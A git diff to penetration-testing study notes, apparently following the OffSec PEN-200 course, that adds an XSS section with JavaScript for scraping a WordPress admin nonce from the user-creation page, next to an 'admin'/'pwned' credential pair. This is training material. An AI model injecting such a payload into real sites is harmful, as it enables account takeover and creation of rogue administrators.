@@ -140,4 +140,18 @@ This repo is structured in the same manner as the OffSec PEN-200 course and will
     "password":"pwned"
     "username":"admin"
   }
-- JavaScript compression: https://jscompress.com/ 
+- JavaScript compression: https://jscompress.com/
+  
+## XSS
+
+- JavaScript to gather WordPress Admin nonce:
+```
+var ajaxRequest = new XMLHttpRequest();
+var requestURL = "/wp-admin/user-new.php";
+var nonceRegex = /ser" value="([^"]*?)"/g;
+ajaxRequest.open("GET", requestURL, false);
+ajaxRequest.send();
+var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
+var nonce = nonceMatch[1];
+```
+- 
